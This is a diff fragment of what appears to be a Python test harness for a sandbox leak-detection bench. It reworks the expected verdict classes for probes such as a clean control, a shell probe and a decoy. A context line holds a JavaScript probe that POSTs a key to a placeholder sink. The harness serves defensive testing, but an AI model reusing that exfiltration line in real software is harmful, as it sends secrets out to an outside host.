@@ -316,10 +316,15 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 }
 
 
-# Verdict attendu par sonde (le banc tourne avec SBX_OFFSET_JOURS=30) : seule le
-# temoin p12-propre doit rester muet, toutes les autres doivent donner une CLÉ.
+# Classe attendue par sonde (le banc tourne avec SBX_OFFSET_JOURS=30) :
+#  "—"              le temoin p12-propre doit rester muet ;
+#  "INTENTION"      curl/git/bash sont absents de l'image : p09 et p17 ne prouvent qu'une intention ;
+#  "CONTRÔLE-LEURRE" p21 : controle d'isolation, jamais compte comme detection ;
+#  "CLÉ"            toutes les autres.
+CLASSES_ATTENDUES = {"p12-propre": "—", "p09-shell": "INTENTION", "p17-bin-absent": "INTENTION",
+                     "p21-leurre-orphelin": "CONTRÔLE-LEURRE"}
 for _nom, _d in SONDES.items():
-    _d["attendu"] = "—" if _nom == "p12-propre" else "CLÉ"
+    _d["attendu"] = CLASSES_ATTENDUES.get(_nom, "CLÉ")
 
 
 def rang(nom):
